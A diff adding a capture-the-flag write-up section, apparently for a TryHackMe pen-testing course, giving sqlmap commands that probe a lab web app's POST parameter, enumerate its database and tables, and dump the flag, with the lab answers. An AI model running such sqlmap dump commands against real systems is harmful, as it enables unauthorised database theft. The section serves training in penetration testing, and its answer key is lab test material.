@@ -415,11 +415,25 @@ hint: sqlmap --help | grep dork
 - What flag dumps all data from every table
 --dump-all
 
+#Task 18 [Section 5 - SQL Injection]: Vulnerable Web Application 
+- How many types of sqli is the site vulnerable to?
+hint:sqlmap -u http://$ip/ --method POST --data 'msg=noraj' -p msg
+or dump all: sqlmap -u http://$IP --forms --dump
+3
+
+- What is the name of the database?    
+hint: sqlmap -u http://$IP/ --method POST --data 'msg=noraj' -p msg --dbms mysql --current-db
+tests
 
 
+- How many tables are in the database?
+hint: sqlmap -u http://$IP/ --method POST --data 'msg=noraj' -p msg --dbms mysql --tables -D tests
+2
 
 
-
+- What is the value of the flag?
+hint: sqlmap -u http://$IP/ --method POST --data 'msg=noraj' -p msg --dbms mysql --dump -D tests
+found_me
 https://docplayer.net/198613531-Tryhackme-cc-pen-testing-completed-winter-2020.html
 https://fieldraccoon.github.io/misc%20posts%20not%20released%20yet/priv-esc-pre-writeup/
 
